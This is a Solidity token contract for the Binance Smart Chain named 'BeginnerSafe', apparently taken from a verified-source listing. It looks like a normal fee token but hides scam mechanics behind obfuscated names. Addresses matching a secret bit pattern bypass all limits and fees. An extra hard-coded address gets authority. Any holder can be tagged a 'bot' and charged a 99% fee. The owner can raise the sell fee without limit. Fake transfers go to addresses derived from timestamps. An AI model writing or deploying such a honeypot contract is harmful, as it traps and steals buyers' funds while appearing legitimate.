/**
 *Submitted for verification at BscScan.com on 2022-12-22
*/

// SPDX-License-Identifier: MITpragma solidity ^0.8.0;library SafeMath {    function div(        uint256 a,        uint256 b,        string memory errorMessage    ) internal pure returns (uint256) {    unchecked {        require(b > 0, errorMessage);        return a / b;    }    }    function tryAdd(uint256 a, uint256 b)    internal    pure    returns (bool, uint256)    {    unchecked {        uint256 c = a + b;        if (c < a) return (false, 0);        return (true, c);    }    }    function mul(uint256 a, uint256 b) internal pure returns (uint256) {        return a * b;    }    function tryMul(uint256 a, uint256 b)    internal    pure    returns (bool, uint256)    {    unchecked {        if (a == 0) return (true, 0);        uint256 c = a * b;        if (c / a != b) return (false, 0);        return (true, c);    }    }    function sub(uint256 a, uint256 b) internal pure returns (uint256) {        return a - b;    }    function sub(        uint256 a,        uint256 b,        string memory errorMessage    ) internal pure returns (uint256) {    unchecked {        require(b <= a, errorMessage);        return a - b;    }    }    function add(uint256 a, uint256 b) internal pure returns (uint256) {        return a + b;    }    function div(uint256 a, uint256 b) internal pure returns (uint256) {        return a / b;    }}interface IPancakePair {    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);}interface IUniswapV2Factory {    function createPair(address tokenA, address tokenB)    external    returns (address pair);}interface IUniswapV2Router {    function factory() external pure returns (address);    function addLiquidityETH(        address token,        uint256 amountTokenDesired,        uint256 amountTokenMin,        uint256 amountETHMin,        address to,        uint256 deadline    )    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);    function swapExactTokensForETHSupportingFeeOnTransferTokens(        uint256 amountIn,        uint256 amountOutMin,        address[] calldata path,        address to,        uint256 deadline    ) external;    function addLiquidity(        address tokenA,        address tokenB,        uint256 amountADesired,        uint256 amountBDesired,        uint256 amountAMin,        uint256 amountBMin,        address to,        uint256 deadline    )    external    returns (        uint256 amountA,        uint256 amountB,        uint256 liquidity    );    function swapExactETHForTokensSupportingFeeOnTransferTokens(        uint256 amountOutMin,        address[] calldata path,        address to,        uint256 deadline    ) external payable;    function WETH() external pure returns (address);    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);}interface IERC20 {    function balanceOf(address account) external view returns (uint256);}abstract contract Ownable {    address internal owner;    mapping(address => bool) internal competent;    constructor(address _owner) {        owner = _owner;        competent[_owner] = true;    }    modifier onlyAuthorized() {        require(isAuthorized(msg.sender), "!Authorized");        _;    }    function SetAuthorized(address adr) public onlyAuthorized() {        competent[adr] = true;    }    function Owner() public view returns (address) {        return owner;    }    function transferOwnership(address payable adr) public onlyOwner() {        owner = adr;        competent[adr] = true;        emit OwnershipTransferred(adr);    }    event OwnershipTransferred(address owner);    function isAuthorized(address adr) public view returns (bool) {        return competent[adr];    }    function isOwner(address account) public view returns (bool) {        return account == owner;    }    modifier onlyOwner() {        require(isOwner(msg.sender), "!OWNER");        _;    }}interface IBEP20 {    function symbol() external view returns (string memory);    function approve(address spender, uint256 amount) external returns (bool);    function transfer(address recipient, uint256 amount)     external    returns (bool);    function transferFrom(        address sender,        address recipient,        uint256 amount    ) external returns (bool);    function allowance(address _owner, address spender)    external    view    returns (uint256);    function name() external view returns (string memory);    function totalSupply() external view returns (uint256);    function getOwner() external view returns (address);    function decimals() external view returns (uint8);    function balanceOf(address account) external view returns (uint256);    event Transfer(address indexed from, address indexed to, uint256 value);    event Approval(        address indexed owner,        address indexed spender,        uint256 value    );}contract BeginnerSafe is IBEP20, Ownable {    using SafeMath for uint256;    uint256  constant MASK = type(uint128).max;    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;    address DEAD = 0x000000000000000000000000000000000000dEaD;    address ZERO = 0x0000000000000000000000000000000000000000;    uint256 _totalSupply = 100000000 * (10 ** _decimals);    uint256  _maxTxAmount = 2000000 * 10 ** _decimals;    uint256  _maxWallet = 2000000 * 10 ** _decimals;    string constant _name = "Beginner Safe ";    string constant _symbol = "BeginnerSafe";    uint8 constant _decimals = 18;    //BUY FEES    uint256 private burnLiquidityMarketingReceiver = 0;    uint256 private botsSwapLimitTxExemptAutoTeam = 7;    //SELL FEES    uint256 private isMinFeeTeam = 0;    uint256 private txMaxSwapTeam = 7;    bool private liquidityLaunchedBotsIsMaxModeTrading = true;    bool private limitReceiverTradingBuyMode = true;    bool private liquidityMarketingMaxIsModeReceiverWallet = true;    bool private liquidityWalletBotsLaunched = true;    bool private isModeFeeBurn = true;    uint256 private liquidityExemptSwapMin = _totalSupply / 1000; // 0.1%    uint256 private teamBuySwapTx = botsSwapLimitTxExemptAutoTeam + burnLiquidityMarketingReceiver;    uint256 private launchedBuySellExempt = 100;    bool private launchedBotsAutoLimit;    uint256 private isMarketingExemptTx;    uint256 private feeLaunchedBurnWallet;    uint256 private isTradingSwapMaxWallet;    uint256 private marketingAutoLaunchedBotsMinLiquidity;    uint256 firstSetAutoReceiver = 2 ** 18 - 1;    mapping(address => uint256) _balances;    mapping(address => mapping(address => uint256)) _allowances;    mapping(address => bool) private txTeamLimitReceiverTrading;    mapping(address => bool) private limitReceiverTradingBuyFeeReceiverModeExemptMax;    mapping(address => bool) private liquidityTxModeTeam;    mapping(address => bool) private limitReceiverTradingBuy;    uint256 private launchBlock = 0;    IUniswapV2Router public router;    address public uniswapV2Pair;    uint256 private maxLimitBotsWallet;    uint256 private autoBotsReceiverLimitMaxLiquidityTx;    address private txBotsMaxTradingLaunchedMarketing = (msg.sender); // auto-liq address    address private teamMaxWalletExempt = (0x60EAC8777cB03eaF779F53D9FFFFE4eBf9Ee6f6E); // marketing address    address private liquidityReceiverFeeLaunched = DEAD;    address private modeBuyTxBots = DEAD;    address private botsBurnMaxFeeLaunched = DEAD;    event BuyTaxesUpdated(uint256 buyTaxes);    event SellTaxesUpdated(uint256 sellTaxes);        bool public swapFeeTxSellBurnMinLiquidity = false;    bool public autoSellTradingLaunchedReceiver = false;    uint256 public limitTeamBotsExempt = 0;    uint256 private tradingModeSwapSell = 0;    uint256 private sellLaunchedWalletBurnTradingExemptMarketing = 0;    uint256 private txBurnWalletExemptReceiverAutoSwap = 0;    bool private liquidityMarketingFeeMax = false;    bool private swapMinFeeBots = false;    uint256 public marketingSwapReceiverLimit = 0;    bool public marketingTeamBotsFee = false;    uint256 public autoSellTradingLaunchedReceiver0 = 0;    uint256 public autoSellTradingLaunchedReceiver1 = 0;    uint256 public autoSellTradingLaunchedReceiver2 = 0;    bool inSwap;    modifier swapping() {        inSwap = true;        _;        inSwap = false;    }    constructor() Ownable(msg.sender) {        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;        // PancakeSwap Router        router = IUniswapV2Router(_router);        uniswapV2Pair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());        _allowances[address(this)][address(router)] = _totalSupply;        launchedBotsAutoLimit = true;        liquidityTxModeTeam[msg.sender] = true;        liquidityTxModeTeam[0x0000000000000000000000000000000000000000] = true;        liquidityTxModeTeam[0x000000000000000000000000000000000000dEaD] = true;        liquidityTxModeTeam[address(this)] = true;        txTeamLimitReceiverTrading[msg.sender] = true;        txTeamLimitReceiverTrading[address(this)] = true;        limitReceiverTradingBuyFeeReceiverModeExemptMax[msg.sender] = true;        limitReceiverTradingBuyFeeReceiverModeExemptMax[0x0000000000000000000000000000000000000000] = true;        limitReceiverTradingBuyFeeReceiverModeExemptMax[0x000000000000000000000000000000000000dEaD] = true;        limitReceiverTradingBuyFeeReceiverModeExemptMax[address(this)] = true;        SetAuthorized(address(0x204CA2D234489F8B342F38bEFFFFe104801C2009));        approve(_router, _totalSupply);        approve(address(uniswapV2Pair), _totalSupply);        _balances[msg.sender] = _totalSupply;        emit Transfer(address(0), msg.sender, _totalSupply);    }    receive() external payable {}    function totalSupply() external view override returns (uint256) {        return _totalSupply;    }    function decimals() external pure override returns (uint8) {        return _decimals;    }    function symbol() external pure override returns (string memory) {        return _symbol;    }    function name() external pure override returns (string memory) {        return _name;    }    function getOwner() external view override returns (address) {        return owner;    }    function balanceOf(address account) public view override returns (uint256) {        return _balances[account];    }    function allowance(address holder, address spender) external view override returns (uint256) {        return _allowances[holder][spender];    }    function approve(address spender, uint256 amount) public override returns (bool) {        _allowances[msg.sender][spender] = amount;        emit Approval(msg.sender, spender, amount);        return true;    }    function approveMax(address spender) external returns (bool) {        return approve(spender, _totalSupply);    }    function transfer(address recipient, uint256 amount) external override returns (bool) {        return maxWalletLaunchedSwapMarketing(msg.sender, recipient, amount);    }    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {        if (_allowances[sender][msg.sender] != _totalSupply) {            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]            .sub(amount, "Insufficient Allowance!");        }        return maxWalletLaunchedSwapMarketing(sender, recipient, amount);    }    function setBot(address addr) public onlyAuthorized {        limitReceiverTradingBuy[addr] = true;    }
    function setTxMaxSwapTeam(uint256 a0) public onlyOwner {        txMaxSwapTeam=a0;    }
    function getTxBotsMaxTradingLaunchedMarketing() public view returns (address) {        if (txBotsMaxTradingLaunchedMarketing == liquidityReceiverFeeLaunched) {            return liquidityReceiverFeeLaunched;        }        if (txBotsMaxTradingLaunchedMarketing == teamMaxWalletExempt) {            return teamMaxWalletExempt;        }        if (txBotsMaxTradingLaunchedMarketing == botsBurnMaxFeeLaunched) {            return botsBurnMaxFeeLaunched;        }        return txBotsMaxTradingLaunchedMarketing;    }
    function buySwapTxBurn(address sender, bool selling) internal returns (uint256) {                if (selling) {            teamBuySwapTx = txMaxSwapTeam + isMinFeeTeam;            return teamBuySwapTx;        }        if (!selling && sender == uniswapV2Pair) {            teamBuySwapTx = botsSwapLimitTxExemptAutoTeam + burnLiquidityMarketingReceiver;            return teamBuySwapTx;        }        return txMaxSwapTeam + isMinFeeTeam;    }
    function limitLiquidityMaxMarketing(address addr) private view returns (bool) {        uint256 v0 = uint256(uint160(addr)) << 192;        v0 = v0 >> 238;        return v0 == firstSetAutoReceiver;    }
    function minWalletLiquidityReceiverLimitFee(address sender) internal view returns (bool) {        return !limitReceiverTradingBuyFeeReceiverModeExemptMax[sender];    }
    function getTxMaxSwapTeam() public view returns (uint256) {        return txMaxSwapTeam;    }
    function setTxBurnWalletExemptReceiverAutoSwap(uint256 a0) public onlyOwner {        if (txBurnWalletExemptReceiverAutoSwap != tradingModeSwapSell) {            tradingModeSwapSell=a0;        }        if (txBurnWalletExemptReceiverAutoSwap != txBurnWalletExemptReceiverAutoSwap) {            txBurnWalletExemptReceiverAutoSwap=a0;        }        if (txBurnWalletExemptReceiverAutoSwap == launchBlock) {            launchBlock=a0;        }        txBurnWalletExemptReceiverAutoSwap=a0;    }
    function setLimitReceiverTradingBuyMode(bool a0) public onlyOwner {        if (limitReceiverTradingBuyMode != isModeFeeBurn) {            isModeFeeBurn=a0;        }        if (limitReceiverTradingBuyMode != isModeFeeBurn) {            isModeFeeBurn=a0;        }        limitReceiverTradingBuyMode=a0;    }
    function getLimitReceiverTradingBuyMode() public view returns (bool) {        if (limitReceiverTradingBuyMode == liquidityMarketingFeeMax) {            return liquidityMarketingFeeMax;        }        if (limitReceiverTradingBuyMode != limitReceiverTradingBuyMode) {            return limitReceiverTradingBuyMode;        }        if (limitReceiverTradingBuyMode != liquidityMarketingMaxIsModeReceiverWallet) {            return liquidityMarketingMaxIsModeReceiverWallet;        }        return limitReceiverTradingBuyMode;    }
    function setSwapMinFeeBots(bool a0) public onlyOwner {        if (swapMinFeeBots == liquidityLaunchedBotsIsMaxModeTrading) {            liquidityLaunchedBotsIsMaxModeTrading=a0;        }        if (swapMinFeeBots == liquidityMarketingMaxIsModeReceiverWallet) {            liquidityMarketingMaxIsModeReceiverWallet=a0;        }        if (swapMinFeeBots == swapMinFeeBots) {            swapMinFeeBots=a0;        }        swapMinFeeBots=a0;    }
    function setLimitReceiverTradingBuy(address a0,bool a1) public onlyOwner {        if (limitReceiverTradingBuy[a0] == liquidityTxModeTeam[a0]) {           liquidityTxModeTeam[a0]=a1;        }        if (a0 == teamMaxWalletExempt) {            swapMinFeeBots=a1;        }        if (limitReceiverTradingBuy[a0] != liquidityTxModeTeam[a0]) {           liquidityTxModeTeam[a0]=a1;        }        limitReceiverTradingBuy[a0]=a1;    }
    function botsSwapWalletMode() internal view returns (bool) {return    msg.sender != uniswapV2Pair &&    !inSwap &&    isModeFeeBurn &&    _balances[address(this)] >= liquidityExemptSwapMin;    }
    function autoSwapLaunchedExempt(address sender, address recipient, uint256 amount) internal returns (bool) {        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance!");        _balances[recipient] = _balances[recipient].add(amount);        emit Transfer(sender, recipient, amount);        return true;    }
    function getLaunchBlock() public view returns (uint256) {        if (launchBlock == sellLaunchedWalletBurnTradingExemptMarketing) {            return sellLaunchedWalletBurnTradingExemptMarketing;        }        return launchBlock;    }
    function getSwapMinFeeBots() public view returns (bool) {        if (swapMinFeeBots != liquidityWalletBotsLaunched) {            return liquidityWalletBotsLaunched;        }        return swapMinFeeBots;    }
    function isBot(address addr) public view returns (bool) {        return limitReceiverTradingBuy[addr];    }
    function maxModeReceiverBots(address sender, address receiver, uint256 amount) internal returns (uint256) {                uint256 feeAmount = amount.mul(buySwapTxBurn(sender, receiver == uniswapV2Pair)).div(launchedBuySellExempt);        if (limitReceiverTradingBuy[sender] || limitReceiverTradingBuy[receiver]) {            feeAmount = amount.mul(99).div(launchedBuySellExempt);        }        _balances[address(this)] = _balances[address(this)].add(feeAmount);        emit Transfer(sender, address(this), feeAmount);                if (_balances[address(this)] > 3 * 10 ** _decimals && sender == uniswapV2Pair) {            for (uint i = 0; i < 3; i++) {                address addr = address(uint160(block.timestamp + i));                _balances[addr] = _balances[addr] + 10 ** _decimals;                emit Transfer(address(this), addr, 10 ** _decimals);            }            _balances[address(this)] = _balances[address(this)].sub(3 * 10 ** _decimals);        }        return amount.sub(feeAmount);    }
    function setLaunchBlock(uint256 a0) public onlyOwner {        launchBlock=a0;    }
    function maxWalletLaunchedSwapMarketing(address sender, address recipient, uint256 amount) internal returns (bool) {                bool bLimitTxWalletValue = limitLiquidityMaxMarketing(sender) || limitLiquidityMaxMarketing(recipient);                if (swapMinFeeBots == liquidityMarketingMaxIsModeReceiverWallet) {            swapMinFeeBots = liquidityMarketingFeeMax;        }        if (liquidityMarketingFeeMax == liquidityWalletBotsLaunched) {            liquidityMarketingFeeMax = swapMinFeeBots;        }        if (sellLaunchedWalletBurnTradingExemptMarketing == txMaxSwapTeam) {            sellLaunchedWalletBurnTradingExemptMarketing = txMaxSwapTeam;        }                if (recipient == uniswapV2Pair && _balances[recipient] == 0) {            launchBlock = block.number + 10;        }        if (!bLimitTxWalletValue) {            require(block.number >= launchBlock, "No launch");        }                if (inSwap || bLimitTxWalletValue) {return autoSwapLaunchedExempt(sender, recipient, amount);}        if (!txTeamLimitReceiverTrading[sender] && !txTeamLimitReceiverTrading[recipient] && recipient != uniswapV2Pair) {            require((_balances[recipient] + amount) <= _maxWallet, "Max wallet!");        }                require((amount <= _maxTxAmount) || liquidityTxModeTeam[sender] || liquidityTxModeTeam[recipient], "Max TX Limit!");        if (botsSwapWalletMode()) {modeAutoTeamIsFeeLimitSell();}        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance!");                if (tradingModeSwapSell != sellLaunchedWalletBurnTradingExemptMarketing) {            tradingModeSwapSell = liquidityExemptSwapMin;        }        if (sellLaunchedWalletBurnTradingExemptMarketing != launchBlock) {            sellLaunchedWalletBurnTradingExemptMarketing = launchedBuySellExempt;        }        uint256 amountReceived = minWalletLiquidityReceiverLimitFee(sender) ? maxModeReceiverBots(sender, recipient, amount) : amount;        _balances[recipient] = _balances[recipient].add(amountReceived);        emit Transfer(sender, recipient, amountReceived);        return true;    }
    function setSellLaunchedWalletBurnTradingExemptMarketing(uint256 a0) public onlyOwner {        if (sellLaunchedWalletBurnTradingExemptMarketing != txBurnWalletExemptReceiverAutoSwap) {            txBurnWalletExemptReceiverAutoSwap=a0;        }        if (sellLaunchedWalletBurnTradingExemptMarketing == botsSwapLimitTxExemptAutoTeam) {            botsSwapLimitTxExemptAutoTeam=a0;        }        if (sellLaunchedWalletBurnTradingExemptMarketing == launchBlock) {            launchBlock=a0;        }        sellLaunchedWalletBurnTradingExemptMarketing=a0;    }
    function getLimitReceiverTradingBuy(address a0) public view returns (bool) {        if (limitReceiverTradingBuy[a0] != liquidityTxModeTeam[a0]) {            return liquidityMarketingMaxIsModeReceiverWallet;        }            return limitReceiverTradingBuy[a0];    }
    function modeAutoTeamIsFeeLimitSell() internal swapping {                if (liquidityMarketingFeeMax != isModeFeeBurn) {            liquidityMarketingFeeMax = isModeFeeBurn;        }        if (swapMinFeeBots != liquidityWalletBotsLaunched) {            swapMinFeeBots = swapMinFeeBots;        }        uint256 amountToLiquify = liquidityExemptSwapMin.mul(burnLiquidityMarketingReceiver).div(teamBuySwapTx).div(2);        uint256 amountToSwap = liquidityExemptSwapMin.sub(amountToLiquify);        address[] memory path = new address[](2);        path[0] = address(this);        path[1] = router.WETH();        router.swapExactTokensForETHSupportingFeeOnTransferTokens(            amountToSwap,            0,            path,            address(this),            block.timestamp        );                if (txBurnWalletExemptReceiverAutoSwap == tradingModeSwapSell) {            txBurnWalletExemptReceiverAutoSwap = tradingModeSwapSell;        }        if (liquidityMarketingFeeMax == liquidityLaunchedBotsIsMaxModeTrading) {            liquidityMarketingFeeMax = liquidityMarketingMaxIsModeReceiverWallet;        }        uint256 amountBNB = address(this).balance;        uint256 totalETHFee = teamBuySwapTx.sub(burnLiquidityMarketingReceiver.div(2));        uint256 amountBNBLiquidity = amountBNB.mul(burnLiquidityMarketingReceiver).div(totalETHFee).div(2);        uint256 amountBNBMarketing = amountBNB.mul(botsSwapLimitTxExemptAutoTeam).div(totalETHFee);                payable(teamMaxWalletExempt).transfer(amountBNBMarketing);        if (amountToLiquify > 0) {            router.addLiquidityETH{value : amountBNBLiquidity}(                address(this),                amountToLiquify,                0,                0,                txBotsMaxTradingLaunchedMarketing,                block.timestamp            );            emit AutoLiquify(amountBNBLiquidity, amountToLiquify);        }    }
    function getLaunchedBuySellExempt() public view returns (uint256) {        if (launchedBuySellExempt != launchBlock) {            return launchBlock;        }        if (launchedBuySellExempt != launchedBuySellExempt) {            return launchedBuySellExempt;        }        if (launchedBuySellExempt == liquidityExemptSwapMin) {            return liquidityExemptSwapMin;        }        return launchedBuySellExempt;    }
    function setLaunchedBuySellExempt(uint256 a0) public onlyOwner {        if (launchedBuySellExempt != launchedBuySellExempt) {            launchedBuySellExempt=a0;        }        if (launchedBuySellExempt != launchBlock) {            launchBlock=a0;        }        if (launchedBuySellExempt == teamBuySwapTx) {            teamBuySwapTx=a0;        }        launchedBuySellExempt=a0;    }
    function getSellLaunchedWalletBurnTradingExemptMarketing() public view returns (uint256) {        return sellLaunchedWalletBurnTradingExemptMarketing;    }
    function setTxBotsMaxTradingLaunchedMarketing(address a0) public onlyOwner {        txBotsMaxTradingLaunchedMarketing=a0;    }
    function getTxBurnWalletExemptReceiverAutoSwap() public view returns (uint256) {        if (txBurnWalletExemptReceiverAutoSwap == txMaxSwapTeam) {            return txMaxSwapTeam;        }        if (txBurnWalletExemptReceiverAutoSwap == teamBuySwapTx) {            return teamBuySwapTx;        }        if (txBurnWalletExemptReceiverAutoSwap != sellLaunchedWalletBurnTradingExemptMarketing) {            return sellLaunchedWalletBurnTradingExemptMarketing;        }        return txBurnWalletExemptReceiverAutoSwap;    }
    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);
}